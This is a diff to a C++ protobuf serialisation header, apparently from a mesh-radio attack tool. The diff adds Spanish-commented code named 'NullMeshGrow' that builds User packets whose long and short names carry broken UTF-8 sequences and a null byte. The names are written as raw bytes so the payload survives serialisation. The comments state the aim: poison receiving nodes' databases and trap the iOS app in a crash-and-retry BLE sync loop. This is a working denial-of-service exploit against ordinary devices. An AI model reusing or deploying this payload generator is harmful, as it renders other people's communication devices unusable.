@@ -204,6 +204,85 @@ inline size_t proto_build_position(uint8_t* out, size_t cap,
     return w.ok() ? w.size() : 0;
 }
 
+// ============================================================
+//  NullMeshGrow - User con long_name/short_name malformados
+//
+//  CVE-2026-42566: un User.long_name con codificacion UTF-8
+//  malformada (p.ej. un byte nulo en medio de una secuencia
+//  multibyte, o bytes de continuacion huerfanos) envenena la
+//  NodeDB de los receptores. La aplicacion iOS aplica validacion
+//  de codificacion y no puede parsear la base de datos, entrando
+//  en un bucle de fallo/reintento de la sincronizacion BLE que
+//  deja el dispositivo inutilizable (DoS, CVSS 7.5).
+//
+//  A diferencia de proto_build_user() (que usa write_field_string
+//  -> strlen), aqui se serializan los nombres como BYTES CRUDOS con
+//  longitud explicita, para poder inyectar '\x00', espacios y
+//  secuencias UTF-8 rotas sin que el terminador nulo corte el campo.
+// ============================================================
+
+// Genera un "owner" malformado (long_name o short_name) combinando
+// espacios, bytes nulos y secuencias UTF-8 multibyte rotas. Devuelve la
+// longitud real de bytes escritos, SIEMPRE <= max_len.
+//
+// IMPORTANTE (CVE-2026-42566 + limites del proto):
+//   - User.long_name  -> max_size = 40 bytes
+//   - User.short_name -> max_size =  4 bytes
+// Si no se respeta el max_size, el parser nanopb del firmware descarta el
+// paquete con "string overflow" y el nombre no llega a la NodeDB.
+inline size_t make_malformed_owner(char* out, size_t cap) {
+    // Patrones de UTF-8 roto / desbordamiento de buffer tipico.
+    // Secuencias con byte inicial sin continuador (0xC3), byte de
+    // continuacion huerfano (0x80) y secuencia multibyte truncada
+    // (0xE2 0x80) que disparan la validacion de codificacion en iOS.
+    static const uint8_t BAD_SEQ[] = {
+        0xC3, 0x80,        // byte inicial + continuacion "huérfana" (UTF-8 invalido)
+        0xE2, 0x80,        // secuencia de 3 bytes truncada
+        'N', 'u', 'l', 'l',// texto visible
+        0x00,              // byte nulo
+        ' ', ' ',          // espacios en blanco
+    };
+    size_t n = sizeof(BAD_SEQ);
+    if (n > cap) n = cap;
+    if (n == 0) { out[0] = ' '; return 1; }
+    memcpy(out, BAD_SEQ, n);
+    return n;
+}
+
+// Serializar User con nombres malformados (bytes crudos, no strlen)
+inline size_t proto_build_user_malformed(uint8_t* out, size_t cap,
+    uint32_t node_id,
+    const uint8_t* long_name, size_t long_len,
+    const uint8_t* short_name, size_t short_len,
+    uint32_t hw_model = HW_MODEL_TBEAM,
+    const uint8_t* public_key = nullptr,
+    size_t pubkey_len = 0)
+{
+    char id_str[12];
+    snprintf(id_str, sizeof(id_str), "!%08x", node_id);
+
+    uint8_t mac[6] = {
+        0x00, 0x11,
+        (uint8_t)(node_id >> 24),
+        (uint8_t)(node_id >> 16),
+        (uint8_t)(node_id >> 8),
+        (uint8_t)(node_id)
+    };
+
+    ProtoWriter w(out, cap);
+    w.write_field_string(1, id_str);                  // id (string)
+    if (long_name && long_len > 0)
+        w.write_field_bytes(2, long_name, long_len);  // long_name (bytes CRUDOS)
+    if (short_name && short_len > 0)
+        w.write_field_bytes(3, short_name, short_len);// short_name (bytes CRUDOS)
+    w.write_field_bytes (4, mac, 6);
+    w.write_field_uint32(5, hw_model);
+    w.write_field_uint32(7, 1);                        // role = CLIENT
+    if (public_key && pubkey_len > 0)
+        w.write_field_bytes(8, public_key, pubkey_len);
+    return w.ok() ? w.size() : 0;
+}
+
 // ---- Serializar Waypoint --------------------------------
 inline size_t proto_build_waypoint(uint8_t* out, size_t cap,
     float lat, float lon,
